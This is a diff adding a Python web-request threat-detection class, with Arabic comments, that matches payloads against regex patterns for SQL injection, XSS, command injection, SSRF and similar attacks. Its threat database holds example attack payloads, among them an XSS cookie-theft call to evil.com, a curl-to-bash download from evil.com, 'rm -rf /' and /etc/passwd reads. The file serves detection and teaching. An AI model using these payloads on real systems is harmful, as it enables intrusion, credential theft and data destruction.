@@ -1,0 +1,588 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+🧞‍♂️ أسرار المارد الرقمي - نظام الأمن السيبراني المتكامل
+🔐 Digital Genie Secrets - Complete Cybersecurity System
+⚡ Professional-Grade Security Suite
+"""
+
+import re
+import hashlib
+import secrets
+import time
+import json
+from datetime import datetime, timedelta
+from collections import defaultdict, Counter
+import base64
+from typing import Dict, List, Tuple, Optional
+import ipaddress
+
+class DigitalGenieSecuritySystem:
+    """🧞 نظام المارد الرقمي الشامل للأمن السيبراني"""
+    
+    def __init__(self):
+        print(self._banner())
+        
+        # 🎯 قواعد بيانات التهديدات
+        self.threat_intelligence = self._load_threat_intelligence()
+        
+        # 📊 تتبع الهجمات
+        self.attack_logs = []
+        self.ip_reputation = defaultdict(lambda: {
+            'score': 100,  # 100 = نظيف، 0 = خطر جداً
+            'attacks': [],
+            'first_seen': datetime.now(),
+            'last_seen': datetime.now(),
+            'blocked': False,
+            'warnings': 0
+        })
+        
+        # 🚫 القوائم السوداء والبيضاء
+        self.blacklist = set()
+        self.whitelist = set()
+        
+        # 🔐 قواعد كلمات المرور
+        self.leaked_passwords = self._load_leaked_passwords()
+        
+        # 📈 إحصائيات فورية
+        self.stats = {
+            'total_requests': 0,
+            'blocked_attacks': 0,
+            'clean_requests': 0,
+            'critical_threats': 0,
+            'ips_blocked': 0
+        }
+        
+        # 🎓 نظام التعلم الآلي البسيط
+        self.ml_patterns = self._initialize_ml_patterns()
+        
+    def _banner(self):
+        """🎨 شعار النظام"""
+        return """
+╔══════════════════════════════════════════════════════════════════════╗
+║                                                                      ║
+║     🧞‍♂️  أسرار المارد الرقمي - نظام الحماية الخارق  🧞‍♂️         ║
+║                                                                      ║
+║            🔐 Digital Genie Secrets v3.0 🔐                         ║
+║                                                                      ║
+║     ⚡ AI-Powered Threat Detection & Prevention System ⚡           ║
+║                                                                      ║
+║  🛡️  الحماية الكاملة من جميع التهديدات السيبرانية  🛡️             ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+        """
+    
+    def _load_threat_intelligence(self):
+        """🎯 تحميل قاعدة بيانات التهديدات المتقدمة"""
+        return {
+            'SQL_INJECTION': {
+                'id': 'ATK-001',
+                'name': '💉 SQL Injection Attack',
+                'category': 'Injection',
+                'severity': 'CRITICAL',
+                'cvss_score': 9.8,
+                'patterns': [
+                    r"(\bunion\b.*\bselect\b)",
+                    r"(\bor\b\s+['\"]?1['\"]?\s*=\s*['\"]?1)",
+                    r"(\band\b\s+['\"]?1['\"]?\s*=\s*['\"]?1)",
+                    r"(drop\s+table)",
+                    r"(insert\s+into)",
+                    r"(delete\s+from)",
+                    r"(exec(\s|\+)+(s|x)p\w+)",
+                    r"([';]\s*--)",
+                    r"(/\*.*?\*/)",
+                    r"(\bxp_cmdshell\b)",
+                    r"(\bor\b.*\blike\b)",
+                    r"(\bhaving\b.*\bgroup\s+by\b)",
+                    r"(0x[0-9a-f]+)",
+                    r"(benchmark\s*\()",
+                    r"(sleep\s*\(\s*\d+\s*\))",
+                ],
+                'description': 'محاولة حقن أوامر SQL للتحكم في قاعدة البيانات',
+                'impact': 'سرقة البيانات، تعديل السجلات، حذف الجداول، الحصول على صلاحيات إدارية',
+                'remediation': 'استخدم Prepared Statements، Input Validation، Least Privilege',
+                'references': ['OWASP-A03:2021', 'CWE-89'],
+                'attack_vector': 'Network/Adjacent',
+                'examples': [
+                    "admin' OR '1'='1' --",
+                    "1'; DROP TABLE users--",
+                    "' UNION SELECT NULL, username, password FROM users--"
+                ]
+            },
+            
+            'XSS': {
+                'id': 'ATK-002',
+                'name': '⚡ Cross-Site Scripting',
+                'category': 'Injection',
+                'severity': 'HIGH',
+                'cvss_score': 7.3,
+                'patterns': [
+                    r"<script[^>]*>.*?</script>",
+                    r"javascript\s*:",
+                    r"on\w+\s*=",
+                    r"<iframe[^>]*>",
+                    r"<object[^>]*>",
+                    r"<embed[^>]*>",
+                    r"<svg[^>]*onload",
+                    r"<img[^>]*onerror",
+                    r"eval\s*\(",
+                    r"expression\s*\(",
+                    r"vbscript:",
+                    r"<base[^>]*href",
+                ],
+                'description': 'حقن كود JavaScript خبيث يعمل في متصفح الضحية',
+                'impact': 'سرقة الكوكيز، Session Hijacking، Phishing، تشويه الصفحات',
+                'remediation': 'Output Encoding، Content Security Policy، HTTPOnly Cookies',
+                'references': ['OWASP-A03:2021', 'CWE-79'],
+                'attack_vector': 'Network',
+                'examples': [
+                    "<script>alert(document.cookie)</script>",
+                    "<img src=x onerror='fetch(`http://evil.com?c=${document.cookie}`)'>",
+                    "javascript:alert('XSS')"
+                ]
+            },
+            
+            'COMMAND_INJECTION': {
+                'id': 'ATK-003',
+                'name': '💻 OS Command Injection',
+                'category': 'Injection',
+                'severity': 'CRITICAL',
+                'cvss_score': 9.9,
+                'patterns': [
+                    r"[;&|]\s*(ls|dir|cat|type|rm|del|mv|cp|wget|curl)",
+                    r"`.*?`",
+                    r"\$\(.*?\)",
+                    r"&&|\|\|",
+                    r">\s*/dev/null",
+                    r"/etc/passwd",
+                    r"/etc/shadow",
+                    r"cmd\.exe",
+                    r"powershell",
+                    r"bash\s+-c",
+                    r"sh\s+-c",
+                    r"\|\s*nc\s+",
+                    r"/bin/(ba)?sh",
+                ],
+                'description': 'تنفيذ أوامر نظام التشغيل على السيرفر',
+                'impact': 'السيطرة الكاملة على السيرفر، سرقة البيانات، تنصيب Backdoor',
+                'remediation': 'تجنب shell=True، استخدم Whitelist، Input Validation شديدة',
+                'references': ['OWASP-A03:2021', 'CWE-78'],
+                'attack_vector': 'Network',
+                'examples': [
+                    "; cat /etc/passwd",
+                    "| whoami",
+                    "`rm -rf /`",
+                    "$(curl http://evil.com/malware.sh | bash)"
+                ]
+            },
+            
+            'PATH_TRAVERSAL': {
+                'id': 'ATK-004',
+                'name': '📁 Path Traversal',
+                'category': 'Access Control',
+                'severity': 'HIGH',
+                'cvss_score': 8.6,
+                'patterns': [
+                    r"\.\./",
+                    r"\.\.\\",
+                    r"%2e%2e[/\\]",
+                    r"%252e%252e",
+                    r"\.\.%2f",
+                    r"\.\.%5c",
+                    r"/etc/passwd",
+                    r"/etc/shadow",
+                    r"c:\\windows\\",
+                    r"c:/windows/",
+                    r"\\windows\\system32",
+                    r"\.\.;/",
+                    r"%00",  # Null byte injection
+                ],
+                'description': 'الوصول لملفات خارج المجلد المصرح به',
+                'impact': 'قراءة ملفات حساسة، الوصول لكلمات المرور، سرقة الإعدادات',
+                'remediation': 'Whitelist، Path Canonicalization، chroot jail',
+                'references': ['OWASP-A01:2021', 'CWE-22'],
+                'attack_vector': 'Network',
+                'examples': [
+                    "../../../etc/passwd",
+                    "....//....//etc/passwd",
+                    "..%252f..%252fetc%252fpasswd"
+                ]
+            },
+            
+            'XXE': {
+                'id': 'ATK-005',
+                'name': '📄 XML External Entity',
+                'category': 'Injection',
+                'severity': 'HIGH',
+                'cvss_score': 8.2,
+                'patterns': [
+                    r"<!ENTITY",
+                    r"<!DOCTYPE",
+                    r"SYSTEM\s+['\"]file://",
+                    r"SYSTEM\s+['\"]http://",
+                    r"SYSTEM\s+['\"]ftp://",
+                    r"PUBLIC\s+",
+                    r"%\w+;",
+                    r"&\w+;",
+                ],
+                'description': 'استغلال معالج XML لقراءة ملفات أو تنفيذ طلبات SSRF',
+                'impact': 'قراءة ملفات النظام، SSRF، DOS، Port Scanning',
+                'remediation': 'تعطيل External Entities، استخدم JSON بدلاً من XML',
+                'references': ['OWASP-A05:2021', 'CWE-611'],
+                'attack_vector': 'Network',
+                'examples': [
+                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+                    '<!ENTITY xxe SYSTEM "http://internal.server/secret">'
+                ]
+            },
+            
+            'SSRF': {
+                'id': 'ATK-006',
+                'name': '🌐 Server-Side Request Forgery',
+                'category': 'Security Misconfiguration',
+                'severity': 'HIGH',
+                'cvss_score': 8.5,
+                'patterns': [
+                    r"localhost",
+                    r"127\.0\.0\.\d+",
+                    r"0\.0\.0\.0",
+                    r"::1",
+                    r"169\.254\.\d+\.\d+",  # AWS metadata
+                    r"metadata\.google",
+                    r"192\.168\.",
+                    r"10\.\d+\.",
+                    r"172\.(1[6-9]|2[0-9]|3[0-1])\.",
+                    r"file://",
+                    r"dict://",
+                    r"gopher://",
+                    r"ldap://",
+                ],
+                'description': 'إجبار السيرفر على إرسال طلبات لأهداف داخلية أو خبيثة',
+                'impact': 'الوصول للشبكة الداخلية، سرقة AWS Keys، Port Scanning',
+                'remediation': 'Whitelist Domains، منع Private IPs، Disable Redirects',
+                'references': ['OWASP-A10:2021', 'CWE-918'],
+                'attack_vector': 'Network',
+                'examples': [
+                    "http://169.254.169.254/latest/meta-data/",
+                    "http://localhost:6379",
+                    "file:///etc/passwd"
+                ]
+            },
+            
+            'LDAP_INJECTION': {
+                'id': 'ATK-007',
+                'name': '🗂️ LDAP Injection',
+                'category': 'Injection',
+                'severity': 'HIGH',
+                'cvss_score': 7.5,
+                'patterns': [
+                    r"\*\)\(",
+                    r"\)\(\&",
+                    r"\)\(\|",
+                    r"\*\|",
+                    r"admin\*",
+                    r"\(\|\(uid=\*\)\)",
+                ],
+                'description': 'التلاعب باستعلامات LDAP لتجاوز المصادقة',
+                'impact': 'تجاوز تسجيل الدخول، الوصول لبيانات Active Directory',
+                'remediation': 'Input Validation، LDAP Escaping، Parameterized Queries',
+                'references': ['OWASP-A03:2021', 'CWE-90'],
+                'attack_vector': 'Network',
+                'examples': [
+                    "*)(uid=*))(|(uid=*",
+                    "admin*)((|userPassword=*)"
+                ]
+            },
+            
+            'CSRF': {
+                'id': 'ATK-008',
+                'name': '🎭 Cross-Site Request Forgery',
+                'category': 'Broken Access Control',
+                'severity': 'MEDIUM',
+                'cvss_score': 6.5,
+                'patterns': [
+                    r"<form[^>]*action\s*=",
+                    r"<img[^>]*src\s*=\s*['\"]https?://",
+                ],
+                'description': 'إجبار المستخدم على تنفيذ إجراءات غير مرغوبة',
+                'impact': 'تغيير كلمة المرور، تحويل أموال، تعديل إعدادات',
+                'remediation': 'CSRF Tokens، SameSite Cookies، Double Submit',
+                'references': ['OWASP-A01:2021', 'CWE-352'],
+                'attack_vector': 'Network',
+                'examples': [
+                    '<img src="http://bank.com/transfer?to=attacker&amount=1000">',
+                    '<form action="http://site.com/change-email" method="POST">'
+                ]
+            },
+            
+            'NOSQL_INJECTION': {
+                'id': 'ATK-009',
+                'name': '🔮 NoSQL Injection',
+                'category': 'Injection',
+                'severity': 'HIGH',
+                'cvss_score': 8.1,
+                'patterns': [
+                    r"\$ne\s*:",
+                    r"\$gt\s*:",
+                    r"\$lt\s*:",
+                    r"\$where\s*:",
+                    r"\$regex\s*:",
+                    r"{\s*\$",
+                    r"true\s*,\s*true",
+                ],
+                'description': 'حقن أوامر في قواعد بيانات NoSQL مثل MongoDB',
+                'impact': 'تجاوز المصادقة، استخراج البيانات، تنفيذ كود',
+                'remediation': 'Input Validation، Type Checking، Parameterized Queries',
+                'references': ['OWASP-A03:2021', 'CWE-943'],
+                'attack_vector': 'Network',
+                'examples': [
+                    '{"username": {"$ne": null}, "password": {"$ne": null}}',
+                    '{"$where": "this.password == \'xxx\' || true"}'
+                ]
+            },
+            
+            'FILE_UPLOAD': {
+                'id': 'ATK-010',
+                'name': '📤 Malicious File Upload',
+                'category': 'Injection',
+                'severity': 'CRITICAL',
+                'cvss_score': 9.8,
+                'patterns': [
+                    r"\.php\d?\b",
+                    r"\.jsp\b",
+                    r"\.asp\b",
+                    r"\.aspx\b",
+                    r"\.py\b",
+                    r"\.pl\b",
+                    r"\.cgi\b",
+                    r"\.sh\b",
+                    r"\.exe\b",
+                    r"\.bat\b",
+                    r"\.cmd\b",
+                    r"<?php",
+                    r"<%.*%>",
+                ],
+                'description': 'رفع ملفات خبيثة لتنفيذ كود على السيرفر',
+                'impact': 'Remote Code Execution، Web Shell، السيطرة على السيرفر',
+                'remediation': 'Whitelist Extensions، Magic Number Check، Separate Storage',
+                'references': ['OWASP-A04:2021', 'CWE-434'],
+                'attack_vector': 'Network',
+                'examples': [
+                    'shell.php',
+                    'backdoor.jsp',
+                    'image.jpg.php'
+                ]
+            },
+            
+            'BRUTE_FORCE': {
+                'id': 'ATK-011',
+                'name': '🔨 Brute Force Attack',
+                'category': 'Authentication',
+                'severity': 'MEDIUM',
+                'cvss_score': 5.3,
+                'patterns': [],  # يتم الكشف عن طريق العد
+                'description': 'محاولات متكررة لتخمين كلمات المرور',
+                'impact': 'اختراق الحسابات، DOS',
+                'remediation': 'Rate Limiting، Account Lockout، CAPTCHA، 2FA',
+                'references': ['OWASP-A07:2021', 'CWE-307'],
+                'attack_vector': 'Network',
+                'examples': []
+            },
+            
+            'DOS': {
+                'id': 'ATK-012',
+                'name': '💥 Denial of Service',
+                'category': 'Availability',
+                'severity': 'HIGH',
+                'cvss_score': 7.5,
+                'patterns': [],  # يتم الكشف عن طريق التكرار
+                'description': 'إغراق السيرفر بطلبات كثيرة',
+                'impact': 'توقف الخدمة، خسائر مالية، سمعة سيئة',
+                'remediation': 'Rate Limiting، CDN، WAF، Load Balancing',
+                'references': ['OWASP-A04:2021', 'CWE-400'],
+                'attack_vector': 'Network',
+                'examples': []
+            }
+        }
+    
+    def _load_leaked_passwords(self):
+        """🔑 قاعدة بيانات كلمات المرور المسربة الشائعة"""
+        return {
+            '123456', 'password', '12345678', 'qwerty', '123456789',
+            '12345', '1234', '111111', '1234567', 'dragon',
+            '123123', 'baseball', 'iloveyou', 'trustno1', '1234567890',
+            'sunshine', 'master', '123321', '666666', 'photoshop',
+            '1qaz2wsx', 'qwertyuiop', 'ashley', 'mustang', 'michael',
+            'admin', 'root', 'administrator', 'guest', 'test',
+            'letmein', 'welcome', 'monkey', 'abc123', 'football',
+            'shadow', 'superman', 'batman', 'pass', 'password1'
+        }
+    
+    def _initialize_ml_patterns(self):
+        """🤖 تهيئة أنماط التعلم الآلي البسيط"""
+        return {
+            'suspicious_user_agents': [
+                'sqlmap', 'nikto', 'nmap', 'scanner', 'crawler', 
+                'bot', 'spider', 'scraper', 'hack', 'exploit'
+            ],
+            'anomaly_scores': defaultdict(list),
+            'normal_behavior_baseline': {}
+        }
+    
+    def analyze_request(self, payload: str, ip: str, method: str = 'GET',
+                       headers: Dict = None, url: str = '', user_agent: str = '') -> Dict:
+        """🔍 تحليل شامل للطلب"""
+        
+        self.stats['total_requests'] += 1
+        
+        print(f"\n{'='*90}")
+        print(f"🎯 المارد الرقمي يفحص طلب جديد...")
+        print(f"{'='*90}")
+        print(f"🌐 IP: {ip}")
+        print(f"🔧 Method: {method}")
+        print(f"📍 URL: {url if url else 'N/A'}")
+        print(f"🤖 User-Agent: {user_agent[:50] + '...' if len(user_agent) > 50 else user_agent}")
+        print(f"📦 Payload Preview: {payload[:100]}..." if len(payload) > 100 else f"📦 Payload: {payload}")
+        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        
+        # ✅ فحص القائمة البيضاء
+        if ip in self.whitelist:
+            print(f"✅ IP موثوق في القائمة البيضاء - تم السماح\n{'='*90}")
+            self.stats['clean_requests'] += 1
+            return {'status': 'WHITELISTED', 'allowed': True}
+        
+        # 🚫 فحص القائمة السوداء
+        if ip in self.blacklist or self.ip_reputation[ip]['blocked']:
+            print(f"🚫 IP محظور! الطلب مرفوض\n{'='*90}")
+            self.stats['blocked_attacks'] += 1
+            return {'status': 'BLOCKED', 'reason': 'Blacklisted IP', 'allowed': False}
+        
+        # 🔍 بدء التحليل المتعدد الطبقات
+        threats_detected = []
+        total_threat_score = 0
+        
+        # الطبقة 1: فحص أنماط الهجمات المعروفة
+        for threat_id, threat_info in self.threat_intelligence.items():
+            if threat_info['patterns']:
+                for pattern in threat_info['patterns']:
+                    matches = re.findall(pattern, payload, re.IGNORECASE)
+                    if matches:
+                        threats_detected.append({
+                            'threat_id': threat_id,
+                            'info': threat_info,
+                            'pattern': pattern,
+                            'matches': matches[:5],  # أول 5 تطابقات فقط
+                            'confidence': 95
+                        })
+                        total_threat_score += threat_info['cvss_score'] * 10
+                        break
+        
+        # الطبقة 2: فحص السلوك الشاذ
+        anomaly_score = self._detect_anomalies(ip, payload, method, user_agent)
+        total_threat_score += anomaly_score
+        
+        # الطبقة 3: فحص Brute Force
+        if self._check_brute_force(ip):
+            threats_detected.append({
+                'threat_id': 'BRUTE_FORCE',
+                'info': self.threat_intelligence['BRUTE_FORCE'],
+                'pattern': 'Multiple failed attempts',
+                'matches': [f"{len(self.ip_reputation[ip]['attacks'])} attempts"],
+                'confidence': 90
+            })
+            total_threat_score += 50
+        
+        # الطبقة 4: فحص DOS/DDOS
+        if self._check_dos_pattern(ip):
+            threats_detected.append({
+                'threat_id': 'DOS',
+                'info': self.threat_intelligence['DOS'],
+                'pattern': 'High frequency requests',
+                'matches': ['DOS pattern detected'],
+                'confidence': 85
+            })
+            total_threat_score += 75
+            
+        # الطبقة 5: فحص User Agent المشبوه
+        if user_agent and self._is_suspicious_user_agent(user_agent):
+            print(f"⚠️  User-Agent مشبوه تم اكتشافه!\n")
+            total_threat_score += 30
+        
+        # الطبقة 6: فحص IP Geolocation & Reputation
+        ip_risk = self._check_ip_reputation(ip)
+        total_threat_score += ip_risk
+        
+        # تحديث سجل IP
+        self.ip_reputation[ip]['last_seen'] = datetime.now()
+        self.ip_reputation[ip]['attacks'].extend([t['threat_id'] for t in threats_detected])
+        self.ip_reputation[ip]['score'] = max(0, 100 - total_threat_score / 10)
+        
+        # تسجيل الهجوم
+        if threats_detected:
+            self._log_attack(payload, ip, threats_detected, total_threat_score, method, url)
+        
+        # اتخاذ القرار وعرض النتائج
+        result = self._make_decision(threats_detected, total_threat_score, ip)
+        
+        return result
+    
+    def _detect_anomalies(self, ip: str, payload: str, method: str, user_agent: str) -> float:
+        """🤖 كشف السلوك الشاذ باستخدام ML البسيط"""
+        anomaly_score = 0
+        
+        # 1. طول غير عادي للـ Payload
+        if len(payload) > 10000:
+            anomaly_score += 20
+            print(f"⚠️  Payload طويل جداً ({len(payload)} حرف)")
+        
+        # 2. أحرف مشبوهة بكثافة عالية
+        suspicious_chars = set('<>\'"`;&|$(){}[]')
+        suspicious_count = sum(1 for c in payload if c in suspicious_chars)
+        if suspicious_count > len(payload) * 0.1:  # أكثر من 10%
+            anomaly_score += 15
+            print(f"⚠️  كثافة عالية من الأحرف المشبوهة: {suspicious_count}")
+        
+        # 3. تشفير متعدد الطبقات (محاولة التخفي)
+        encoding_indicators = ['%25', '%2e', '%2f', '%5c', 'base64', 'utf-8']
+        if sum(1 for ind in encoding_indicators if ind.lower() in payload.lower()) > 2:
+            anomaly_score += 25
+            print(f"⚠️  محاولة إخفاء باستخدام تشفيرمتعدد")
+        
+        # 4. كلمات مفتاحية خطيرة متعددة
+        dangerous_keywords = ['union', 'select', 'drop', 'delete', 'update', 
+                             'insert', 'exec', 'script', 'eval', 'alert']
+        keyword_count = sum(1 for kw in dangerous_keywords if kw in payload.lower())
+        if keyword_count >= 3:
+            anomaly_score += keyword_count * 10
+            print(f"⚠️  كلمات مفتاحية خطيرة: {keyword_count}")
+        
+        return anomaly_score
+    
+    def _check_brute_force(self, ip: str) -> bool:
+        """🔨 فحص هجمات Brute Force"""
+        attacks = self.ip_reputation[ip]['attacks']
+        
+        # أكثر من 5 محاولات فاشلة في آخر 5 دقائق
+        recent_attacks = [a for a in attacks if a in ['SQL_INJECTION', 'XSS', 'COMMAND_INJECTION']]
+        
+        time_diff = (datetime.now() - self.ip_reputation[ip]['first_seen']).seconds
+        
+        if time_diff < 300 and len(recent_attacks) > 5:  # 5 دقائق
+            return True
+        
+        return False
+    
+    def _check_dos_pattern(self, ip: str) -> bool:
+        """💥 فحص أنماط DOS"""
+        # حساب معدل الطلبات
+        time_diff = (datetime.now() - self.ip_reputation[ip]['first_seen']).seconds
+        
+        if time_diff == 0:
+            return False
+        
+        attack_rate = len(self.ip_reputation[ip]['attacks']) / max(time_diff, 1)
+        
+        # أكثر من 10 طلبات في الثانية
+        return attack_rate > 10
+    
+    def _is_suspicious_user_agent
